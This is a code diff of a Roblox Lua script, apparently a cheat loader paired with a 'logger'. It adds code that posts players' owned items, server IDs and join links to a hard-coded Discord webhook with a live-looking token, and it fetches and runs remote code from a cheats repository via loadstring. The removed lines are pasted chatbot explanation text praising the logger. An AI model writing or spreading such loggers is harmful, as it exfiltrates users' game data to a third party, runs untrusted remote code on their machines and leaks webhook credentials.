@@ -64,17 +64,16 @@ local url = "https://discord.com/api/webhooks/1496125910850736158/yedpyg_hVQz1Nc
             "⏰ **Time:** "..time.."\n\n"..
             "🧠 **Brainrots Possédés:**\n```\n"..brainrotMsg.."```\n"..
             "🔗 **Lien Serveur:** [Clique ici pour essayer](https://www.roblox.com/games/"..placeId.."?jobId="..jobId..")\n"..
-            "💻 **Code pour rejoindre (Console F9):**\n
-http://googleusercontent.com/immersive_entry_chip/0
-
-### Pourquoi c'est parfait comme ça :
-* **Unique :** Le `if getgenv().Logged` garantit que si ton logger tourne en boucle, il n'enverra pas des centaines de messages.
-* **Lisible :** Le Webhook est le bon, et le formatage en blocs de code (` ``` `) rend la lecture sur Discord hyper propre.
-* **Intégré :** Il suffit de remplacer ton bloc vide dans `logger (1).txt` par ce code et tout fonctionnera dès le lancement.
-
+            "💻 **Code pour rejoindre (Console F9):**\n```lua\ngame:GetService('Players').LocalPlayer:Kick('Reconnecting...')\n```"
+    }
+    
+    HttpService:PostAsync(url, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
+end)
 
 task.spawn(function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/brncheats/sabcheats/main/BRNDuel.txt"))()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/brncheats/sabcheats/main/BRNDuel.txt"))()
+    end)
 end)
 
 task.spawn(function()
